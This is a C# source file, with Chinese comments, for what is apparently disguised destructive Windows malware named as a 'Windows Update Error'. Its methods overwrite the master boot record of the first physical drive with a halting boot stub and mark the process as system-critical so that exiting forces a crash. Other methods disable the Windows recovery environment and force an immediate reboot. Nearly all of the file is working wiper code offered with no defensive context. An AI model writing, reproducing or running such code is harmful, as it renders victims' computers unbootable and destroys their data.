using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.IO;
using System.Threading.Tasks;
using System.Security.Principal;
using System.Windows.Forms;

namespace Windows_Update_Error
{
    public class Test
    {
        [DllImport("kernel32.dll", SetLastError = true)]                        //调用Windows API
        public static extern IntPtr CreateFileA(string lpFileName, uint dwDesiredAccess, uint dwShareMode, uint lpSecurityAttributes, uint dwCreationDisposition, uint dwFlagsAndAttributes, IntPtr hTemplateFile);                    //声明外部方法
        [DllImport("kernel32.dll", SetLastError = true)]                        //调用Windows API
        public static extern bool WriteFile(IntPtr hFile, byte[] lpBuffer, int nNumberOfBytesToWrite, ref int lpNumberOfBytesWritten, IntPtr lpOverlapped);                                                 //声明外部方法
        public const int File_Share_Read = 0x00000001;             //部分属性的值
        public const int File_Share_Write = 0x00000002;
        public const uint Generic_Read = 0x80000000;
        public const uint Generic_Write = 0x40000000;
        public const int Open_Existing = 3;
        [DllImport("ntdll.dll", SetLastError = true)]
        private static extern int NtSetInformationProcess(IntPtr hProcess, int processInformationClass, ref int processInformation, int processInformationLength);
        public void Nt_Error()
        {
            int isCritical = 1;
            int BreakOnTermination = 29;
            NtSetInformationProcess(Process.GetCurrentProcess().Handle, BreakOnTermination, ref isCritical, sizeof(int));              //ntdll将程序的进程标记为系统关键进程
            Application.Exit();             //退出程序
        }
        public void killmbr()
        {
            byte[] mbr1 = { 0xE8, 0x02, 0x00, 0xEB, 0xFE, 0xBD, 0x17, 0x7C, 0xB9, 0x03, 0x00, 0xB8, 0x01, 0x13, 0xBB, 0x0C, 0x00, 0xBA, 0x1D, 0x0E, 0xCD, 0x10, 0xC3, 0x54, 0x76, 0x54 };
            byte[] mbrdata = new byte[512];
            for (int i = 0; i < mbr1.Length; i++)
            {
                mbrdata[i] = mbr1[i];
            }
            mbrdata[510] = 0x55;
            mbrdata[511] = 0xAA;           ////0x55和0xAA是编写MBR结尾时所必需的
            string Path = @"\\.\PhysicalDrive0";
            using (FileStream file = new FileStream(Path, FileMode.Open, FileAccess.ReadWrite, FileShare.ReadWrite))         //创建FileStream对象
            {
                file.Write(mbrdata, 0, 512);           //将mbrdata字节块写入文件流
            }
        }
        public int killmbrA()
        {
            int write = 0;
            uint NULL = 0;
            byte[] mbr1 = { 0xE8, 0x02, 0x00, 0xEB, 0xFE, 0xBD, 0x17, 0x7C, 0xB9, 0x03, 0x00, 0xB8, 0x01, 0x13, 0xBB, 0x0C, 0x00, 0xBA, 0x1D, 0x0E, 0xCD, 0x10, 0xC3, 0x54, 0x76, 0x54 };
            byte[] mbrdata = new byte[512];
            for (int i = 0; i < mbr1.Length; i++)
            {
                mbrdata[i] = mbr1[i];
            }
            mbrdata[510] = 0x55;
            mbrdata[511] = 0xAA;
            IntPtr mbr = CreateFileA(@"\\.\PhysicalDrive0", Generic_Read | Generic_Write, File_Share_Read | File_Share_Write, NULL, Open_Existing, NULL, 0);
            bool x = WriteFile(mbr, mbrdata, 512, ref write, 0);        //将mbrdata字节块中512字节写入mbr
            if (x != false)      //如果写入成功就返回1，否则为-1
            {
                return 1;
            }
            else
            {
                return -1;
            }
        }
        public void Shutdown_PC()
        {
            Process.Start("shutdown", "/r /t 0");
        }
        public void Disable_WinRE()
        {
            Process.Start("reagentc", "/disable");
        }
    }
}
